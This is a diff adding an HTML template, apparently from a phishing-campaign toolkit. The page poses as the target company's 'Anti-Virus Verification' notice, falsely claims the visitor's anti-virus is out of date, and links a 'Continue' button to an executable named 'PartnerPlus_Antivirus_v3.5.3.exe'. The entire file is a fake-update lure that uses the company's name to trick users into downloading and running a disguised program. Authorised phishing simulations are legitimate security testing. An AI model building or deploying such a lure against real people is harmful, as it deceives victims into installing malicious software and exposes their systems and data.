@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html>
+	<head>
+		<meta http-equiv="content-type" content="text/html; charset=UTF-8" />
+		<title>{{ client.company_name }} Anti-Virus Verification</title>
+		<link href="./include/style-scan-new.css" media="screen" rel="stylesheet" type="text/css" />
+		<link rel="SHORTCUT ICON" href="./images/favicon.ico" />
+	</head>
+<body class="index">
+	<div id="container">
+		<header>
+			<h1>
+				<img name="logo" src="./images/logo.png" height="75">
+			</h1>
+		</header>
+		<div id="stage">
+			<section class="compatibility">
+				<article>
+					<h2>Your Anti-Virus is Out of Date</h2>
+					<br>
+					<p>Your anti-virus is currently out of date. To download and install the new anti-virus software please click the green "Continue" button below.</p>
+				</article>
+				<div class="download">
+					<ol class="links">
+						<li class="link">
+							<a class="btn download" href="./PartnerPlus_Antivirus_v3.5.3.exe">
+								<span>Continue</span>
+							</a>
+						</li>
+					</ol>
+				</div>
+			</section>
+		</div>
+		<footer style="display: none">
+			<p class="copy">Copyright &copy; {{ time.local|strftime('%Y') }} {{ client.company_name }}, All rights reserved.</p>
+		</footer>
+	</div>
+</body>
+</html>
